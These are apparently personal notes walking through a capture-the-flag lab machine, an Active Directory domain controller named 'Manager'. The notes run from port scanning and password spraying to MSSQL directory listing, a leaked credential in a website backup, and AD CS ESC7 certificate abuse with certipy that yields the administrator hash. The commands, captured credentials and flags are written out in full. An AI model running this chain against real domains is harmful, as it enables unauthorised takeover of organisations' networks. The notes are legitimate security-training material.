# Manager
- domain controller
- smb, http, ldap, mssql
- Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb)

## NMAP
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49721/tcp open  unknown
49739/tcp open  unknown

```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Manager
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-07 23:39:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-07T23:40:31+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-07T23:40:30+00:00; +6h59m59s from scanner time.                                                                                                                                 11:40:31 [1/77]
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.11.236:1433:
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.236:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-11-07T23:40:31+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-07T23:13:03
|_Not valid after:  2055-11-07T23:13:03
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-11-07T23:40:31+00:00; +7h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-07T23:40:30+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-11-07T23:39:50
|_  start_date: N/A
```


## Foothold
- website is a simple 4 page website. no posts
- vhost/subdomain enum gave nothing
- trying the tilde enumeration
```
sudo go run cmd/shortscan/main.go http://manager.htb
ðŸŒ€ Shortscan v0.9.2 Â· an IIS short filename enumeration tool by bitquark

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
URL: http://manager.htb/
Running: Microsoft-IIS/10.0
Vulnerable: Yes!
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
WEB~1.CON            WEB.CON?
INDEX~1.HTM          INDEX.HTM?          INDEX.HTML
ABOUT~1.HTM          ABOUT.HTM?          ABOUT.HTML
WEBSIT~1.ZIP         WEBSIT?.ZIP?
SERVIC~1.HTM         SERVIC?.HTM?        SERVICE.HTML
CONTAC~1.HTM         CONTAC?.HTM?        CONTACT.HTML
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Finished! Requests: 770; Retries: 0; Sent 147297 bytes; Received 336560 bytes

```
- `egrep -r ^websit /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt`
- found nothing

- Tried `kerbrute userenum`
- rid brute forcing - `
```
nxc smb 10.10.11.236 -u 'guest' -p '' --rid-brute
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\guest:
SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)

```

- save users to user.txt
- try password spraying the users.txt as username and password
- found `operator:operator`
- running bloodhound - nothing to attack
- `impacket-mssqlclient manager.htb/operator:operator@10.10.11.236 -windows-auth`
    - tried getting the users hash with responder. could not crack it.
    - found a new way to list directories 
    - `EXEC master..xp_dirtree 'C:\inetpub\wwwroot', 1, 1;`
        - we see the backup file name
- download the `website-backup-27-07-23-old.zip`
    - the hidden xml file contains `raven:R4v3nBe5tD3veloP3r!123`
- evilwinrm to get user.txt - ba5859248090a1fcc504445c0f18382d

## Privesc
- `certipy-ad find -vulnerable -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236` 
    - vulnerable to `esc7: User has dangerous permissions.`
    - Certificate Authority - `manager-DC01-CA`
- Steps:
```
certipy-ad ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.10.11.236' -target 'manager.htb' \
    -ca 'manager-DC01-CA' -add-officer 'raven'
# [*] Successfully added officer 'Raven' on 'manager-DC01-CA'

certipy-ad ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.10.11.236' -target 'manager.htb' \
    -ca 'manager-DC01-CA' -enable-template 'SubCA'
# [*] Successfully enabled 'SubCA' on 'manager-DC01-C

certipy-ad req \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.10.11.236' -target 'manager.htb' \
    -ca 'manager-DC01-CA' -template 'SubCA' \
    -upn 'administrator@manager.htb' -sid 'S-1-5-21-...-500'
# [*] Requesting certificate via RPC
[*] Request ID is 21
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '21.key'
[*] Wrote private key to '21.key'
[-] Failed to request certificate

- Note request Id from above and add it below
certipy-ad ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.10.11.236' -target 'manager.htb' \
    -ca 'manager-DC01-CA' -issue-request '21'

certipy-ad req \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.10.11.236' -target 'manager.htb' \
    -ca 'manager-DC01-CA' -retrieve '21'

[*] Retrieving certificate with ID 21
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Loaded private key from '21.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

```
certipy-ad auth \
    -dc-ip '10.10.11.236' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'manager.htb'

[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

- `evil-winrm -i 10.10.11.236 -u Administrator -H ae5064c2f62317332c88629e025924ef`
    - get root.txt - 977478150a2f8c1881892522dc876621
